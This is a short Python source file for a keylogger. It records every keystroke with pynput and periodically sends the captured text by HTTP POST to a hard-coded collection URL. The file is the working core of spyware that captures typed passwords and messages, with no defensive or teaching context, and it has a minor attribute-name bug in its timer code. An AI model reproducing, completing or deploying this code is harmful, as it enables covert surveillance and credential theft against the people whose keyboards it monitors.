import pynput.keyboard
import threading
import requests

log = ""
url = "http://localhost:8000/port29775002217"

class Keylogger:

    def __init__(self, time_interval, email, password):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password
        self.url = url

    def append_to_log(self, string):
        self.log = self.log + string
        

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_main()
        self.log = ""
        timer = threading.Timer(self.time_interval, self.report)
        timer.start()

    def send_main(self):
        data_to_send = { 'data': str(self.log) }
        requests.post(self.url, data = data_to_send)

    def start(self):

        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()